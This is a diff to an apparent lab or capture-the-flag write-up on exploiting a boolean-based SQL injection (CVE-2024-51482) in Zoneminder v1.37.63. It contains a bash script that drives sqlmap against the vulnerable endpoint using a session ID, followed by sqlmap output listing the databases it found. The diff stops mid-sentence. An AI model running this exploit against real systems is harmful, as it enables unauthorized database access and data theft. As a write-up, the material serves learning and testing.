@@ -57,7 +57,7 @@ CVE and Zoneminder v1.37.63 placed into the search bar reveals [CVE-2024-51482](
 
 Zoneminder v1.37.63 is vulnerable to boolean-based SQL Injection. The impact of this is total control of SQL Databases: loss of data confidentiality and integrity. Leading to information disclosure and possible privilege escalation.
 
-We can exploit the vulnerability and use the PoC provided. We can grab the session ID and automate it using the `zmPoC.sh` file.
+We can exploit the vulnerability and use the PoC provided. We can grab the session ID and automate it using the `zmPoC.sh` file and `sqlmap`.
 
 ```
 #!/bin/bash
@@ -67,3 +67,22 @@ sqlmap -u 'http://10.129.61.151/zm/index.php?view=request&request=event&action=r
 	-p tid --dbms=mysql --batch --dbs
 ```
 
+sqlmap takes a long time to run so after about 10-20 minutes we can see revealed information about the SQL databases.
+
+```
+[20:01:24] [INFO] adjusting time delay to 3 seconds due to good response times
+3
+[20:01:27] [INFO] retrieved: information_schema
+[20:06:12] [INFO] retrieved: performance_schema
+[20:10:47] [INFO] retrieved: zm
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] zm
+
+[20:11:25] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.129.61.151'                                          
+
+[*] ending @ 20:11:25 /2026-05-17/
+```
+
+Great. This allows us to 
